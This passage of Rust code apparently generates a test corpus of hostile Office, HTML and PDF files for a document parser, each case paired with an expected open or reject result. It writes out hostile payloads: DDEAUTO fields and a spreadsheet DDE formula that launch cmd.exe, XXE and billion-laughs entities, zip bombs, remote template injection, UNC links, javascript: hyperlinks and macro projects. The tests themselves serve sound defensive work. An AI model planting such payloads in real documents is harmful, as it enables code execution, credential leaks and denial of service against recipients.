        DOC_RELS,
        "rIdPkg",
        "package",
        "embeddings/Middle.docx",
        false,
    );
    out.push(Case {
        name: "zip-nested.docx".into(),
        app: App::Doc,
        expect: Expect::Either,
        threat: "packages nested three deep, the innermost a zip bomb",
        bytes: outer.build()?,
        macros: false,
        macros_saved: false,
        keep_parts: vec!["/word/embeddings/Middle.docx".into()],
        keep_text: vec![],
    });
    let mut many = plain.entries();
    for i in 0..25_000 {
        many.push((format!("word/media/x{i}.bin"), vec![b'x']));
    }
    out.push(Case {
        name: "zip-many-entries.docx".into(),
        app: App::Doc,
        expect: Expect::Reject,
        threat: "25 000 ZIP entries",
        bytes: zip(&many)?,
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![],
    });

    // XML.
    let deep = "<w:sdt><w:sdtContent>".repeat(100_000);
    out.push(Case {
        name: "xml-deep-nesting.docx".into(),
        app: App::Doc,
        expect: Expect::Either,
        threat: "100 000 nested content controls",
        bytes: docx(&deep)?,
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![],
    });
    out.push(Case {
        name: "xml-billion-laughs.docx".into(),
        app: App::Doc,
        expect: Expect::Either,
        threat: "billion laughs: 10^9 internal entity expansion",
        bytes: docx_pkg(
            &billion_laughs("w:document"),
            &wp("&lol9;").replace("&amp;", "&"),
        )
        .build()?,
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![],
    });
    let refs = "&big;".repeat(20_000);
    out.push(Case {
        name: "xml-quadratic-blowup.docx".into(),
        app: App::Doc,
        expect: Expect::Either,
        threat: "64 KiB entity referenced 20 000 times (1.3 GB if expanded)",
        bytes: docx_pkg(
            &quadratic("w:document"),
            &format!(r"<w:p><w:r><w:t>{refs}</w:t></w:r></w:p>"),
        )
        .build()?,
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![],
    });
    out.push(Case {
        name: "xml-xxe.docx".into(),
        app: App::Doc,
        expect: Expect::Either,
        threat: "external entities and DTD over file: and http: (XXE)",
        bytes: docx_pkg(
            &xxe("w:document", cfg),
            r"<w:p><w:r><w:t>A&xfile;B&xhttp;C</w:t></w:r></w:p>",
        )
        .build()?,
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![],
    });

    // External relationships: linked pictures over http / file / UNC, a linked OLE
    // object, a sub-document.
    let mut p = docx_pkg(
        "",
        &[
            wp("Ảnh liên kết ngoài"),
            inline_picture(1, r#"<a:blip r:link="rIdL1"/>"#),
            inline_picture(2, r#"<a:blip r:link="rIdL2"/>"#),
            inline_picture(3, r#"<a:blip r:link="rIdL3"/>"#),
            r#"<w:p><w:r><w:object><o:OLEObject Type="Link" ProgID="Excel.Sheet.12" ShapeID="_x0000_i1025" DrawAspect="Content" ObjectID="_1" r:id="rIdOleLink" UpdateMode="Always"><o:LinkType>EnhancedMetaFile</o:LinkType></o:OLEObject></w:object></w:r></w:p>"#.to_owned(),
            r#"<w:subDoc r:id="rIdSub"/>"#.to_owned(),
        ]
        .concat(),
    );
    let pic_http = format!("{}/linked.png", cfg.http);
    let pic_file = format!("{}.png", cfg.file_url);
    let pic_unc = format!(r"{}\linked.png", cfg.unc);
    let ole = format!(r"{}\book.xlsx", cfg.unc);
    let sub = format!("{}/subdoc.docx", cfg.http);
    p.rel(DOC_RELS, "rIdL1", "image", &pic_http, true);
    p.rel(DOC_RELS, "rIdL2", "image", &pic_file, true);
    p.rel(DOC_RELS, "rIdL3", "image", &pic_unc, true);
    p.rel(DOC_RELS, "rIdOleLink", "oleObject", &ole, true);
    p.rel(DOC_RELS, "rIdSub", "subDocument", &sub, true);
    out.push(Case {
        name: "external-relationships.docx".into(),
        app: App::Doc,
        expect: Expect::Open,
        threat: "TargetMode=External pictures (http, file, UNC), linked OLE object, sub-document",
        bytes: p.build()?,
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![esc(&pic_http), esc(&pic_file), esc(&pic_unc)],
    });

    // Hyperlinks to javascript: / file: / UNC / vbscript:.
    let targets = [
        "javascript:alert(document.cookie)".to_owned(),
        cfg.file_url.clone(),
        cfg.unc.clone(),
        "vbscript:msgbox(1)".to_owned(),
    ];
    let mut body = wp("Liên kết nguy hiểm");
    for i in 0..targets.len() {
        let _ = write!(
            body,
            r#"<w:p><w:hyperlink r:id="rIdH{i}"><w:r><w:t>link {i}</w:t></w:r></w:hyperlink></w:p>"#
        );
    }
    let mut p = docx_pkg("", &body);
    for (i, t) in targets.iter().enumerate() {
        p.rel(DOC_RELS, &format!("rIdH{i}"), "hyperlink", t, true);
    }
    out.push(Case {
        name: "hyperlinks-unsafe.docx".into(),
        app: App::Doc,
        expect: Expect::Open,
        threat: "hyperlinks to javascript:, file:, UNC, vbscript:",
        bytes: p.build()?,
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: targets.iter().map(|t| esc(t)).collect(),
    });

    // Embedded OLE "Package" holding a fake executable.
    let mut p = docx_pkg(
        "",
        &[
            wp("Đối tượng OLE nhúng"),
            r#"<w:p><w:r><w:object><o:OLEObject Type="Embed" ProgID="Package" ShapeID="_x0000_i1026" DrawAspect="Icon" ObjectID="_2" r:id="rIdOle"/></w:object></w:r></w:p>"#.to_owned(),
        ]
        .concat(),
    );
    p.default_ct("bin", CT_OLE);
    p.put(
        "word/embeddings/oleObject1.bin",
        None,
        ole_package_with_exe()?,
    );
    p.rel(
        DOC_RELS,
        "rIdOle",
        "oleObject",
        "embeddings/oleObject1.bin",
        false,
    );
    out.push(Case {
        name: "ole-embedded-exe.docx".into(),
        app: App::Doc,
        expect: Expect::Open,
        threat: "OLE Package object carrying an .exe (inert bytes)",
        bytes: p.build()?,
        macros: false,
        macros_saved: false,
        keep_parts: vec!["/word/embeddings/oleObject1.bin".into()],
        keep_text: vec![],
    });

    // Macro-enabled document.
    let mut p = docx_pkg("", &wp("Tài liệu có macro"));
    p.put(
        "word/document.xml",
        bo_binary::vba::macro_enabled_content_type(CT_DOCX),
        document_xml("", &wp("Tài liệu có macro")),
    );
    p.put(
        "word/vbaProject.bin",
        Some(bo_binary::vba::CT_VBA_PROJECT),
        bo_binary::vba_write::sample_project("doc")?,
    );
    p.rel(
        DOC_RELS,
        "rIdVba",
        bo_binary::vba::REL_VBA_PROJECT,
        "vbaProject.bin",
        false,
    );
    out.push(Case {
        name: "macro-vba.docm".into(),
        app: App::Doc,
        expect: Expect::Open,
        threat: "VBA project (AutoOpen-style macro module)",
        bytes: p.build()?,
        macros: true,
        macros_saved: true,
        keep_parts: vec!["/word/vbaProject.bin".into()],
        keep_text: vec![],
    });
    out.push(Case {
        name: "macro-legacy.doc".into(),
        app: App::Doc,
        expect: Expect::Open,
        threat: "binary .doc with a VBA project in its Macros storage",
        bytes: graft_vba(
            BASE_DOC,
            "/Macros",
            &bo_binary::vba_write::sample_project("doc")?,
        )?,
        macros: true,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![],
    });

    // DDE and fields pointing outside.
    let dde = [
        field(
            r#"DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe""#,
            "kết quả DDEAUTO",
        ),
        field(r#"DDE "cmd" "/c notepad" "A1""#, "kết quả DDE"),
        simple_field(r#"DDEAUTO cmd "/c whoami""#, "kết quả DDEAUTO đơn"),
    ]
    .concat();
    out.push(Case {
        name: "dde-fields.docx".into(),
        app: App::Doc,
        expect: Expect::Open,
        threat: "DDEAUTO / DDE fields starting cmd.exe",
        bytes: docx(&dde)?,
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec!["DDEAUTO".into()],
    });
    let include = [
        field(
            &format!(r#"INCLUDEPICTURE "{}/include.png" \d"#, cfg.http),
            "ảnh ngoài",
        ),
        field(
            &format!(r#"INCLUDETEXT "{}""#, cfg.file_url),
            "văn bản ngoài",
        ),
        field(
            &format!(
                r#"INCLUDETEXT "{}\\secret.docx""#,
                cfg.unc.replace('\\', "\\\\")
            ),
            "văn bản UNC",
        ),
        field(
            &format!(
                r#"LINK Excel.Sheet.12 "{}\\book.xlsx" "Sheet1!R1C1" \a"#,
                cfg.unc.replace('\\', "\\\\")
            ),
            "liên kết",
        ),
        field(r#"HYPERLINK "javascript:alert(1)""#, "liên kết script"),
    ]
    .concat();
    out.push(Case {
        name: "include-fields.docx".into(),
        app: App::Doc,
        expect: Expect::Open,
        threat: "INCLUDEPICTURE / INCLUDETEXT / LINK fields to http, file and UNC",
        bytes: docx(&include)?,
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![
            "INCLUDETEXT".into(),
            "INCLUDEPICTURE".into(),
            "LINK Excel.Sheet.12".into(),
        ],
    });

    // Remote template ([ECMA-376 Part 1] §17.15.1.6 attachedTemplate).
    let mut p = docx_pkg("", &wp("Mẫu từ xa"));
    p.put(
        "word/settings.xml",
        Some("application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"),
        format!(
            r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:settings xmlns:w="{W_NS}" xmlns:r="{R}"><w:attachedTemplate r:id="rIdTpl"/><w:linkStyles/></w:settings>"#
        ),
    );
    p.rel(DOC_RELS, "rIdSet", "settings", "settings.xml", false);
    let tpl = format!("{}/template.dotm", cfg.http);
    p.rel(
        "word/_rels/settings.xml.rels",
        "rIdTpl",
        "attachedTemplate",
        &tpl,
        true,
    );
    out.push(Case {
        name: "remote-template.docx".into(),
        app: App::Doc,
        expect: Expect::Open,
        threat: "attachedTemplate fetched over http (template injection)",
        bytes: p.build()?,
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![esc(&tpl)],
    });

    // SVG picture with script and external references (PNG fallback + svgBlip).
    let mut p = docx_pkg(
        "",
        &[
            wp("Ảnh SVG có script"),
            inline_picture(
                4,
                r#"<a:blip r:embed="rIdPng"><a:extLst><a:ext uri="{96DAC541-7B7A-43D3-8B79-37D633B846F1}"><asvg:svgBlip xmlns:asvg="http://schemas.microsoft.com/office/drawing/2016/SVG/main" r:embed="rIdSvg"/></a:ext></a:extLst></a:blip>"#,
            ),
        ]
        .concat(),
    );
    p.default_ct("png", "image/png");
    p.default_ct("svg", "image/svg+xml");
    p.put("word/media/image1.png", None, png(1, 1));
    p.put("word/media/image2.svg", None, svg_hostile(cfg));
    p.rel(DOC_RELS, "rIdPng", "image", "media/image1.png", false);
    p.rel(DOC_RELS, "rIdSvg", "image", "media/image2.svg", false);
    out.push(Case {
        name: "svg-script.docx".into(),
        app: App::Doc,
        expect: Expect::Open,
        threat: "SVG picture with <script>, onload and external href",
        bytes: p.build()?,
        macros: false,
        macros_saved: false,
        keep_parts: vec!["/word/media/image2.svg".into()],
        keep_text: vec![],
    });

    // HTML / MHTML with scripts and remote resources.
    out.push(Case {
        name: "web-script.html".into(),
        app: App::Doc,
        expect: Expect::Open,
        threat: "HTML with scripts, handlers, remote images/styles/frames, meta refresh",
        bytes: html_hostile(cfg).into_bytes(),
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![],
    });
    out.push(Case {
        name: "web-script.mht".into(),
        app: App::Doc,
        expect: Expect::Open,
        threat: "MHTML with script parts and remote Content-Location",
        bytes: mht_hostile(cfg).into_bytes(),
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![],
    });
    out.push(Case {
        name: "pdf-actions.pdf".into(),
        app: App::Doc,
        expect: Expect::Open,
        threat: "PDF with OpenAction JavaScript, Launch, URI, GoToR and an embedded file",
        bytes: pdf_hostile(cfg),
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![],
    });

    // Malformed images.
    let mut p = docx_pkg(
        "",
        &[
            wp("Ảnh kích thước khổng lồ"),
            inline_picture(5, r#"<a:blip r:embed="rIdI1"/>"#),
            inline_picture(6, r#"<a:blip r:embed="rIdI2"/>"#),
            inline_picture(7, r#"<a:blip r:embed="rIdI3"/>"#),
            inline_picture(8, r#"<a:blip r:embed="rIdI4"/>"#),
        ]
        .concat(),
    );
    for (ext, ct) in [
        ("png", "image/png"),
        ("jpeg", "image/jpeg"),
        ("gif", "image/gif"),
        ("bmp", "image/bmp"),
    ] {
        p.default_ct(ext, ct);
    }
    p.put("word/media/huge.png", None, png(100_000, 100_000));
    p.put("word/media/huge.jpeg", None, jpeg(65_500, 65_500));
    p.put("word/media/huge.gif", None, gif_huge());
    p.put("word/media/huge.bmp", None, bmp_huge());
    for (i, n) in ["huge.png", "huge.jpeg", "huge.gif", "huge.bmp"]
        .iter()
        .enumerate()
    {
        p.rel(
            DOC_RELS,
            &format!("rIdI{}", i + 1),
            "image",
            &format!("media/{n}"),
            false,
        );
    }
    out.push(Case {
        name: "image-huge-dimensions.docx".into(),
        app: App::Doc,
        expect: Expect::Open,
        threat: "PNG 100000², JPEG 65500², GIF 65535², BMP 10^6² headers with no pixel data",
        bytes: p.build()?,
        macros: false,
        macros_saved: false,
        keep_parts: vec!["/word/media/huge.png".into()],
        keep_text: vec![],
    });

    // Oversized strings: a 4 MiB word without break opportunities, a 1 MiB attribute.
    let long = noise(1 << 20, 1);
    let attr = noise(256 << 10, 2);
    out.push(Case {
        name: "oversized-string.docx".into(),
        app: App::Doc,
        expect: Expect::Either,
        threat: "1 MiB unbroken run of letters and a 256 KiB style id",
        bytes: docx(&format!(
            r#"<w:p><w:pPr><w:pStyle w:val="{attr}"/></w:pPr><w:r><w:t>{long}</w:t></w:r></w:p>"#
        ))?,
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![],
    });

    // Truncated packages.
    let full = p.build()?;
    out.push(Case {
        name: "truncated.docx".into(),
        app: App::Doc,
        expect: Expect::Reject,
        threat: "package cut in the middle (no central directory)",
        bytes: full[..full.len() / 2].to_vec(),
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![],
    });
    out.push(Case {
        name: "truncated.doc".into(),
        app: App::Doc,
        expect: Expect::Either,
        threat: "compound file cut after its first sectors",
        bytes: BASE_DOC[..BASE_DOC.len() / 3].to_vec(),
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![],
    });
    Ok(())
}

#[allow(clippy::too_many_lines)]
fn sheet_cases(cfg: &Config, out: &mut Vec<Case>) -> Result<()> {
    let base = xlsx_pkg(
        "",
        &format!(r#"<row r="1">{}</row>"#, text_cell("A1", "Bảng tính")),
        "",
        "",
    );

    // A part declaring ~4 GiB.
    let mut entries = base.entries();
    entries.push(("xl/media/declared.bin".into(), vec![0u8; 4096]));
    let mut huge = zip(&entries)?;
    patch_declared_size(&mut huge, "xl/media/declared.bin", 0xFFFF_FFF0);
    out.push(Case {
        name: "zip-huge-declared.xlsx".into(),
        app: App::Sheet,
        expect: Expect::Reject,
        threat: "ZIP entry declaring a 4 GiB uncompressed size",
        bytes: huge,
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![],
    });
    let mut many = base.entries();
    for i in 0..19_000 {
        many.push((format!("xl/media/s{i}.bin"), vec![b's'; 8]));
    }
    out.push(Case {
        name: "zip-many-small-entries.xlsx".into(),
        app: App::Sheet,
        expect: Expect::Open,
        threat: "19 000 tiny ZIP entries (just under the entry limit)",
        bytes: zip(&many)?,
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![],
    });
    out.push(Case {
        name: "zip-bomb-ratio.xlsx".into(),
        app: App::Sheet,
        expect: Expect::Reject,
        threat: "ZIP part of 24 MiB of zeros deflated ~1000:1",
        bytes: zip_with_bomb(&base.entries(), "xl/media/bomb.bin", BOMB_BYTES)?,
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![],
    });

    let deep = format!(
        r#"<row r="1"><c r="A1" t="inlineStr"><is>{}<t>x</t></is></c></row>"#,
        "<r><rPr>".repeat(100_000)
    );
    out.push(Case {
        name: "xml-deep-nesting.xlsx".into(),
        app: App::Sheet,
        expect: Expect::Either,
        threat: "100 000 nested elements in a cell",
        bytes: xlsx_pkg("", &deep, "", "").build()?,
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![],
    });
    out.push(Case {
        name: "xml-billion-laughs.xlsx".into(),
        app: App::Sheet,
        expect: Expect::Either,
        threat: "billion laughs in a worksheet",
        bytes: xlsx_pkg(
            &billion_laughs("worksheet"),
            r#"<row r="1"><c r="A1" t="inlineStr"><is><t>&lol9;</t></is></c></row>"#,
            "",
            "",
        )
        .build()?,
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![],
    });
    out.push(Case {
        name: "xml-xxe.xlsx".into(),
        app: App::Sheet,
        expect: Expect::Either,
        threat: "external entities and DTD (XXE) in a worksheet",
        bytes: xlsx_pkg(
            &xxe("worksheet", cfg),
            r#"<row r="1"><c r="A1" t="inlineStr"><is><t>A&xfile;B&xhttp;C</t></is></c></row>"#,
            "",
            "",
        )
        .build()?,
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![],
    });

    // External workbook links (file / UNC), a DDE link, remote functions.
    let rows = [
        format!(
            r#"<row r="1">{}<c r="B1"><f>[1]Sheet1!A1</f><v>7</v></c></row>"#,
            text_cell("A1", "Liên kết ngoài")
        ),
        r#"<row r="2"><c r="A2" t="e"><f>cmd|' /C calc'!A0</f><v>#REF!</v></c><c r="B2"><f>[2]!'A0'</f><v>0</v></c></row>"#.to_owned(),
        format!(
            r#"<row r="3"><c r="A3" t="str"><f>WEBSERVICE("{0}/webservice")</f><v>cached</v></c><c r="B3" t="str"><f>FILTERXML(WEBSERVICE("{0}/x"),"//a")</f><v>cached</v></c><c r="C3" t="str"><f>HYPERLINK("{1}","mở")</f><v>mở</v></c></row>"#,
            esc(&cfg.http),
            esc(&cfg.file_url)
        ),
    ]
    .concat();
    let mut p = xlsx_pkg(
        "",
        &rows,
        "",
        r#"<externalReferences><externalReference r:id="rIdX1"/><externalReference r:id="rIdX2"/></externalReferences>"#,
    );
    let ct_link = "application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml";
    p.put(
        "xl/externalLinks/externalLink1.xml",
        Some(ct_link),
        format!(
            r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?><externalLink xmlns="{S_NS}" xmlns:r="{R}"><externalBook r:id="rId1"><sheetNames><sheetName val="Sheet1"/></sheetNames><sheetDataSet><sheetData sheetId="0"><row r="1"><cell r="A1"><v>7</v></cell></row></sheetData></sheetDataSet></externalBook></externalLink>"#
        ),
    );
    p.put(
        "xl/externalLinks/externalLink2.xml",
        Some(ct_link),
        format!(
            r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?><externalLink xmlns="{S_NS}"><ddeLink ddeService="cmd" ddeTopic="/c calc.exe"><ddeItems><ddeItem name="A0" advise="1"/></ddeItems></ddeLink></externalLink>"#
        ),
    );
    p.rel(
        "xl/_rels/workbook.xml.rels",
        "rIdX1",
        "externalLink",
        "externalLinks/externalLink1.xml",
        false,
    );
    p.rel(
        "xl/_rels/workbook.xml.rels",
        "rIdX2",
        "externalLink",
        "externalLinks/externalLink2.xml",
        false,
    );
    let unc_target = format!(r"{}\book.xlsx", cfg.unc);
    p.rel(
        "xl/externalLinks/_rels/externalLink1.xml.rels",
        "rId1",
        "externalLinkPath",
        &unc_target,
        true,
    );
    out.push(Case {
        name: "dde-external-links.xlsx".into(),
        app: App::Sheet,
        expect: Expect::Open,
        threat:
            "=cmd|… DDE formula, ddeLink part, external workbook over UNC, WEBSERVICE/FILTERXML",
        bytes: p.build()?,
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec!["ddeService".into(), esc(&unc_target)],
    });

    // Hyperlinks + linked picture.
    let targets = [
        "javascript:alert(1)".to_owned(),
        cfg.file_url.clone(),
        cfg.unc.clone(),
    ];
    let mut rows = String::new();
    let mut links = String::from("<hyperlinks>");
    for (i, _) in targets.iter().enumerate() {
        let r = format!("A{}", i + 1);
        let _ = write!(
            rows,
            r#"<row r="{}">{}</row>"#,
            i + 1,
            text_cell(&r, "liên kết")
        );
        let _ = write!(links, r#"<hyperlink ref="{r}" r:id="rIdH{i}"/>"#);
    }
    links.push_str("</hyperlinks>");
    let mut p = xlsx_pkg("", &rows, "", "");
    let pic = format!("{}/linked.png", cfg.http);
    let drawing = xlsx_picture(&mut p, &pic, true);
    p.put(
        "xl/worksheets/sheet1.xml",
        Some(CT_SHEET),
        format!(
            r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?><worksheet xmlns="{S_NS}" xmlns:r="{R}"><sheetData>{rows}</sheetData>{links}{drawing}</worksheet>"#
        ),
    );
    for (i, t) in targets.iter().enumerate() {
        p.rel(SHEET_RELS, &format!("rIdH{i}"), "hyperlink", t, true);
    }
    out.push(Case {
        name: "hyperlinks-unsafe.xlsx".into(),
        app: App::Sheet,
        expect: Expect::Open,
        threat: "cell hyperlinks to javascript:, file:, UNC and a picture linked over http",
        bytes: p.build()?,
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: targets.iter().map(|t| esc(t)).collect(),
    });

    // OLE object with an .exe.
    let mut p = xlsx_pkg(
        "",
        &format!(r#"<row r="1">{}</row>"#, text_cell("A1", "OLE")),
        r#"<oleObjects><oleObject progId="Package" shapeId="1025" r:id="rIdOle"/></oleObjects>"#,
        "",
    );
    p.default_ct("bin", CT_OLE);
    p.put(
        "xl/embeddings/oleObject1.bin",
        None,
        ole_package_with_exe()?,
    );
    p.rel(
        SHEET_RELS,
        "rIdOle",
        "oleObject",
        "../embeddings/oleObject1.bin",
        false,
    );
    out.push(Case {
        name: "ole-embedded-exe.xlsx".into(),
        app: App::Sheet,
        expect: Expect::Open,
        threat: "OLE Package object carrying an .exe (inert bytes)",
        bytes: p.build()?,
        macros: false,
        macros_saved: false,
        keep_parts: vec!["/xl/embeddings/oleObject1.bin".into()],
        keep_text: vec![],
    });

    // Macros.
    let mut p = xlsx_pkg(
        "",
        &format!(r#"<row r="1">{}</row>"#, text_cell("A1", "Sổ có macro")),
        "",
        "",
    );
    let wb = p
        .parts
        .iter()
        .find(|(n, _)| n == "xl/workbook.xml")
        .map(|(_, d)| d.clone())
        .unwrap_or_default();
    p.put(
        "xl/workbook.xml",
        bo_binary::vba::macro_enabled_content_type(CT_XLSX),
        wb,
    );
    p.put(
        "xl/vbaProject.bin",
        Some(bo_binary::vba::CT_VBA_PROJECT),
        bo_binary::vba_write::sample_project("sheet")?,
    );
    p.rel(
        "xl/_rels/workbook.xml.rels",
        "rIdVba",
        bo_binary::vba::REL_VBA_PROJECT,
        "vbaProject.bin",
        false,
    );
    out.push(Case {
        name: "macro-vba.xlsm".into(),
        app: App::Sheet,
        expect: Expect::Open,
        threat: "VBA project writing to cells",
        bytes: p.build()?,
        macros: true,
        macros_saved: true,
        keep_parts: vec!["/xl/vbaProject.bin".into()],
        keep_text: vec![],
    });
    out.push(Case {
        name: "macro-legacy.xls".into(),
        app: App::Sheet,
        expect: Expect::Open,
        threat: "binary .xls with a VBA project in _VBA_PROJECT_CUR",
        bytes: graft_vba(
            BASE_XLS,
            "/_VBA_PROJECT_CUR",
            &bo_binary::vba_write::sample_project("sheet")?,
        )?,
        macros: true,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![],
    });

    // Malformed picture, oversized strings.
    let mut p = xlsx_pkg("", "", "", "");
    p.default_ct("png", "image/png");
    p.put("xl/media/huge.png", None, png(100_000, 100_000));
    let drawing = xlsx_picture(&mut p, "../media/huge.png", false);
    p.put(
        "xl/worksheets/sheet1.xml",
        Some(CT_SHEET),
        format!(
            r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?><worksheet xmlns="{S_NS}" xmlns:r="{R}"><sheetData/>{drawing}</worksheet>"#
        ),
    );
    out.push(Case {
        name: "image-huge-dimensions.xlsx".into(),
        app: App::Sheet,
        expect: Expect::Open,
        threat: "picture declaring 100000×100000 pixels",
        bytes: p.build()?,
        macros: false,
        macros_saved: false,
        keep_parts: vec!["/xl/media/huge.png".into()],
        keep_text: vec![],
    });
    let long = noise(1 << 20, 3);
    let mut p = xlsx_pkg(
        "",
        r#"<row r="1"><c r="A1" t="s"><v>0</v></c><c r="B1"><f>LEN(A1)</f></c></row>"#,
        "",
        "",
    );
    p.put(
        "xl/sharedStrings.xml",
        Some("application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml"),
        format!(
            r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?><sst xmlns="{S_NS}" count="1" uniqueCount="1"><si><t>{long}</t></si></sst>"#
        ),
    );
    p.rel(
        "xl/_rels/workbook.xml.rels",
        "rIdSst",
        "sharedStrings",
        "sharedStrings.xml",
        false,
    );
    out.push(Case {
        name: "oversized-string.xlsx".into(),
        app: App::Sheet,
        expect: Expect::Either,
        threat: "1 MiB shared string (the format allows 32 767 characters)",
        bytes: p.build()?,
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![],
    });
    let full = base.build()?;
    out.push(Case {
        name: "truncated.xlsx".into(),
        app: App::Sheet,
        expect: Expect::Reject,
        threat: "package cut in the middle",
        bytes: full[..full.len() * 2 / 3].to_vec(),
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![],
    });
    Ok(())
}

#[allow(clippy::too_many_lines)]
fn slide_cases(cfg: &Config, out: &mut Vec<Case>) -> Result<()> {
    let deep = format!(
        "{}{}",
        r#"<p:grpSp><p:nvGrpSpPr><p:cNvPr id="9" name="G"/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr><p:grpSpPr/>"#
            .repeat(100_000),
        "</p:grpSp>".repeat(100_000)
    );
    out.push(Case {
        name: "xml-deep-nesting.pptx".into(),
        app: App::Slide,
        expect: Expect::Either,
        threat: "100 000 nested group shapes",
        bytes: pptx_pkg("", &deep)?.build()?,
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![],
    });
    let refs = "&big;".repeat(20_000);
    out.push(Case {
        name: "xml-quadratic-blowup.pptx".into(),
        app: App::Slide,
        expect: Expect::Either,
        threat: "64 KiB entity referenced 20 000 times",
        bytes: pptx_pkg(
            &quadratic("p:sld"),
            &text_box(2, "", "").replace("<a:t></a:t>", &format!("<a:t>{refs}</a:t>")),
        )?
        .build()?,
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![],
    });
    out.push(Case {
        name: "xml-xxe.pptx".into(),
        app: App::Slide,
        expect: Expect::Either,
        threat: "external entities and DTD (XXE) in a slide",
        bytes: pptx_pkg(
            &xxe("p:sld", cfg),
            &text_box(2, "", "").replace("<a:t></a:t>", "<a:t>A&xfile;B&xhttp;C</a:t>"),
        )?
        .build()?,
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![],
    });

    // External pictures, hyperlinks and actions, linked video.
    let targets = [
        "javascript:alert(1)".to_owned(),
        cfg.file_url.clone(),
        cfg.unc.clone(),
    ];
    let mut shapes = String::new();
    for i in 0..targets.len() {
        shapes.push_str(&text_box(
            u32::try_from(i).unwrap_or(0) + 2,
            "liên kết",
            &format!(r#"<a:hlinkClick r:id="rIdH{i}"/>"#),
        ));
    }
    shapes.push_str(&text_box(
        6,
        "chạy chương trình",
        r#"<a:hlinkClick r:id="rIdProg" action="ppaction://program"/>"#,
    ));
    shapes.push_str(&slide_picture(7, r#"<a:blip r:link="rIdL1"/>"#));
    shapes.push_str(&slide_picture(8, r#"<a:blip r:link="rIdL2"/>"#));
    shapes.push_str(&slide_picture(9, r#"<a:blip r:link="rIdL3"/>"#));
    let mut p = pptx_pkg("", &shapes)?;
    for (i, t) in targets.iter().enumerate() {
        p.rel(SLIDE_RELS, &format!("rIdH{i}"), "hyperlink", t, true);
    }
    p.rel(
        SLIDE_RELS,
        "rIdProg",
        "hyperlink",
        r"C:\Windows\System32\calc.exe",
        true,
    );
    let pics = [
        format!("{}/linked.png", cfg.http),
        format!("{}.png", cfg.file_url),
        format!(r"{}\linked.png", cfg.unc),
    ];
    for (i, t) in pics.iter().enumerate() {
        p.rel(SLIDE_RELS, &format!("rIdL{}", i + 1), "image", t, true);
    }
    out.push(Case {
        name: "external-links.pptx".into(),
        app: App::Slide,
        expect: Expect::Open,
        threat: "hyperlinks to javascript:/file:/UNC, ppaction://program, pictures linked over http/file/UNC",
        bytes: p.build()?,
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: targets
            .iter()
            .chain(pics.iter())
            .map(|t| esc(t))
            .collect(),
    });

    // OLE object.
    let ole = r#"<p:graphicFrame><p:nvGraphicFramePr><p:cNvPr id="5" name="Object 4"/><p:cNvGraphicFramePr/><p:nvPr/></p:nvGraphicFramePr><p:xfrm><a:off x="1000000" y="1000000"/><a:ext cx="914400" cy="914400"/></p:xfrm><a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/presentationml/2006/ole"><p:oleObj progId="Package" r:id="rIdOle" showAsIcon="1"><p:embed/></p:oleObj></a:graphicData></a:graphic></p:graphicFrame>"#;
    let mut p = pptx_pkg("", ole)?;
    p.default_ct("bin", CT_OLE);
    p.put(
        "ppt/embeddings/oleObject1.bin",
        None,
        ole_package_with_exe()?,
    );
    p.rel(
        SLIDE_RELS,
        "rIdOle",
        "oleObject",
        "../embeddings/oleObject1.bin",
        false,
    );
    out.push(Case {
        name: "ole-embedded-exe.pptx".into(),
        app: App::Slide,
        expect: Expect::Open,
        threat: "OLE Package object carrying an .exe (inert bytes)",
        bytes: p.build()?,
        macros: false,
        macros_saved: false,
        keep_parts: vec!["/ppt/embeddings/oleObject1.bin".into()],
        keep_text: vec![],
    });

    // Macros.
    let mut p = pptx_pkg("", &text_box(2, "Bài trình chiếu có macro", ""))?;
    if let Some(t) = p.base_types.as_mut() {
